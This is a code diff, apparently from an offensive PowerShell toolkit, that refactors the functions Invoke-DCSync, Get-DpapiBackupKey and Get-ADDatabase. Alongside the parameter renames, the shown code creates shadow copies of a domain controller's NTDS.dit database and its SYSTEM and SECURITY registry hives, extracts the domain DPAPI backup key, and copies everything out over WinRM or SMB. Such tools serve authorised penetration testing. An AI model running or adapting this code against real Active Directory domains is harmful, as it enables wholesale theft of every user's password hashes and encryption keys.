@@ -36,7 +36,7 @@ Function Invoke-DCSync {
     Param (
         [ValidateNotNullOrEmpty()]
         [String]
-        $Server = $env:LOGONSERVER,
+        $Server = $($env:LOGONSERVER -replace '\\'),
 
         [ValidateNotNullOrEmpty()]
         [Management.Automation.PSCredential]
@@ -128,11 +128,11 @@ Function Get-DpapiBackupKey {
 .PARAMETER Method
     Specifies the method to use, defaults to 'MS-DRSR'.
 
-.PARAMETER TargetDirectory
+.PARAMETER OutputDirectory
     Specifies the target directory for local copy.
 
 .EXAMPLE
-    PS C:\> Get-DpapiBackupKey -TargetDirectory $Env:TEMP
+    PS C:\> Get-DpapiBackupKey -OutputDirectory $Env:TEMP
 
 .EXAMPLE
     PS C:\> Get-DpapiBackupKey -Server DC.ADATUM.CORP -Credential ADATUM\Administrator -Method MS-LSAD
@@ -142,7 +142,7 @@ Function Get-DpapiBackupKey {
     Param (
         [ValidateNotNullOrEmpty()]
         [String]
-        $Server = $env:LOGONSERVER,
+        $Server = $($env:LOGONSERVER -replace '\\'),
 
         [ValidateNotNullOrEmpty()]
         [Management.Automation.PSCredential]
@@ -155,7 +155,7 @@ Function Get-DpapiBackupKey {
 
         [ValidateNotNullOrEmpty()]
         [String]
-        $TargetDirectory = "."
+        $OutputDirectory = "."
     )
 
     Begin {
@@ -210,8 +210,8 @@ Function Get-DpapiBackupKey {
         }
 
         $backupKey = $backupKey | Where-Object {$_.Type -eq 'RSAKey'}
-        $backupKey | Save-DPAPIBlob -DirectoryPath $TargetDirectory
-        Remove-Item kiwiscript.txt
+        $backupKey | Save-DPAPIBlob -DirectoryPath $OutputDirectory
+        Remove-Item "$OutputDirectory\kiwiscript.txt"
         Write-Output $backupKey
     }
 
@@ -244,11 +244,11 @@ Function Get-ADDatabase {
 .PARAMETER Method
     Specifies the copy method to use, defaults to 'ShadowCopy'.
 
-.PARAMETER TargetDirectory
+.PARAMETER OutputDirectory
     Specifies the target directory for local copy.
 
 .EXAMPLE
-    PS C:\> Get-ADDatabase -TargetDirectory $Env:TEMP
+    PS C:\> Get-ADDatabase -OutputDirectory $Env:TEMP
 
 .EXAMPLE
     PS C:\> Get-ADDatabase -Server DC.ADATUM.CORP -Credential ADATUM\Administrator -Protocol Wsman -Method NtdsUtil
@@ -258,7 +258,7 @@ Function Get-ADDatabase {
     Param (
         [ValidateNotNullOrEmpty()]
         [String]
-        $Server = $env:LOGONSERVER,
+        $Server = $($env:LOGONSERVER -replace '\\'),
 
         [ValidateNotNullOrEmpty()]
         [Management.Automation.PSCredential]
@@ -275,7 +275,7 @@ Function Get-ADDatabase {
 
         [ValidateNotNullOrEmpty()]
         [String]
-        $TargetDirectory = "."
+        $OutputDirectory = "."
     )
 
     BEGIN {
@@ -313,21 +313,21 @@ Function Get-ADDatabase {
             }
             until ((Get-CimInstance -ClassName Win32_Process -Filter "ProcessId='$($process.ProcessId)'" -CimSession $cimSession | Where {$_.Name -eq "cmd.exe"}).ProcessID -eq $null)
 
-            Write-Host "[*] Copying the NTDS file and registry hives into $(Resolve-Path $TargetDirectory)"
+            Write-Host "[*] Copying the NTDS file and registry hives into $(Resolve-Path $OutputDirectory)"
             if ($Protocol -eq 'Wsman') {
                 # Download files via PSRemoting
-                Copy-Item -Recurse -Path "$tempDir" -Destination "$TargetDirectory" -FromSession $psSession
+                Copy-Item -Recurse -Path "$tempDir" -Destination "$OutputDirectory" -FromSession $psSession
             }
             else {
                 # Download files via SMB
                 if ($Credential.Username) {
                     $drive = "S"
                     New-PSDrive -Name $drive -Root "\\$Server\C$" -Credential $Credential -PSProvider "FileSystem" | Out-Null
-                    Copy-Item -Recurse -Path $($tempDir -Replace "C:","${drive}:") -Destination "$TargetDirectory"
+                    Copy-Item -Recurse -Path $($tempDir -Replace "C:","${drive}:") -Destination "$OutputDirectory"
                     Remove-PSDrive $drive
                 }
                 else {
-                    Copy-Item -Recurse -Path "\\$Server\$($tempDir -Replace ":","$")" -Destination "$TargetDirectory"
+                    Copy-Item -Recurse -Path "\\$Server\$($tempDir -Replace ":","$")" -Destination "$OutputDirectory"
                 }
             }
 
@@ -353,7 +353,7 @@ Function Get-ADDatabase {
             $process = Invoke-CimMethod -ClassName Win32_ShadowCopy -Name Create -Arguments @{Context="ClientAccessible"; Volume="$ditDrive\"} -CimSession $cimSession
             $shadowCopy = Get-CimInstance -ClassName Win32_ShadowCopy -Filter "ID='$($process.ShadowID)'" -CimSession $cimSession
 
-            Write-Host "[*] Copying the NTDS file into $(Resolve-Path $TargetDirectory)"
+            Write-Host "[*] Copying the NTDS file into $(Resolve-Path $OutputDirectory)"
             if ($Protocol -eq 'Wsman') {
                 $deviceObject = $shadowCopy.DeviceObject.ToString()
                 $tempDir = "C:\Windows\Temp\dump"
@@ -361,13 +361,13 @@ Function Get-ADDatabase {
                 do {
                     Start-Sleep -m 250
                 }
-                until ((Get-CimInstance -ClassName Win32_process -Filter "ProcessId='$($process.ProcessId)'" -CimSession $cimSession | Where {$_.Name -eq "cmd.exe"}).ProcessID -eq $null)
+                until ((Get-CimInstance -ClassName Win32_process -Filter "ProcessId='$($process.ProcessId)'" -CimSession $cimSession -Verbose:$false | Where {$_.Name -eq "cmd.exe"}).ProcessID -eq $null)
 
                 # Download files via PSRemoting
                 $ditBackupPath = "$tempDir\$ditRelativePath"
                 $edbBackupPath = "$tempDir\$edbRelativePath"
-                Copy-Item -Path "$ditBackupPath" -Destination "$TargetDirectory" -FromSession $psSession
-                Copy-Item -Path "$edbBackupPath" -Destination "$TargetDirectory" -FromSession $psSession
+                Copy-Item -Path "$ditBackupPath" -Destination "$OutputDirectory" -FromSession $psSession
+                Copy-Item -Path "$edbBackupPath" -Destination "$OutputDirectory" -FromSession $psSession
             }
             else {
                 # Adapted from https://gist.github.com/jborean93/f60da33b08f8e1d5e0ef545b0a4698a0
@@ -395,8 +395,8 @@ Function Get-ADDatabase {
                 $shadowPath = $shadowCopy.InstallDate.ToUniversalTime().ToString("'@GMT-'yyyy.MM.dd-HH.mm.ss")
                 $ditBackupPath = "\\$Server\$($ditDrive -Replace ':', '$')\$shadowPath\$ditRelativePath"
                 $edbBackupPath = "\\$Server\$($ditDrive -Replace ':', '$')\$shadowPath\$edbRelativePath"
-                Copy-Item -Path "$ditBackupPath" -Destination "$TargetDirectory"
-                Copy-Item -Path "$edbBackupPath" -Destination "$TargetDirectory"
+                Copy-Item -Path "$ditBackupPath" -Destination "$OutputDirectory"
+                Copy-Item -Path "$edbBackupPath" -Destination "$OutputDirectory"
             }
 
             if ($ditDrive -ne 'C:') {
@@ -448,13 +448,13 @@ Function Get-ADDatabase {
                 }
             }
 
-            Write-Host "[*] Copying the registry hives into $(Resolve-Path $TargetDirectory)"
+            Write-Host "[*] Copying the registry hives into $(Resolve-Path $OutputDirectory)"
             if ($Protocol -eq 'Wsman') {
                 # Download files via PSRemoting
                 $ditBackupPath = "$tempDir\Windows\System32\config\SYSTEM"
                 $edbBackupPath = "$tempDir\Windows\System32\config\SECURITY"
-                Copy-Item -Path "$ditBackupPath" -Destination "$TargetDirectory" -FromSession $psSession
-                Copy-Item -Path "$edbBackupPath" -Destination "$TargetDirectory" -FromSession $psSession
+                Copy-Item -Path "$ditBackupPath" -Destination "$OutputDirectory" -FromSession $psSession
+                Copy-Item -Path "$edbBackupPath" -Destination "$OutputDirectory" -FromSession $psSession
 
                 # Delete the shadow link
                 Get-CimInstance -ClassName CIM_LogicalFile -Filter "Name='$($tempDir -Replace '\\','\\')'" -CimSession $cimSession | Remove-CimInstance
@@ -464,8 +464,8 @@ Function Get-ADDatabase {
                 $shadowPath = $shadowCopy.InstallDate.ToUniversalTime().ToString("'@GMT-'yyyy.MM.dd-HH.mm.ss")
                 $systemBackupPath = "\\$Server\C$\$shadowPath\Windows\System32\config\SYSTEM"
                 $securityBackupPath = "\\$Server\C$\$shadowPath\Windows\System32\config\SECURITY"
-                Copy-Item -Path "$systemBackupPath" -Destination "$TargetDirectory"
-                Copy-Item -Path "$securityBackupPath" -Destination "$TargetDirectory"
+                Copy-Item -Path "$systemBackupPath" -Destination "$OutputDirectory"
+                Copy-Item -Path "$securityBackupPath" -Destination "$OutputDirectory"
 
                 # Close the handle
                 $handle.Dispose()
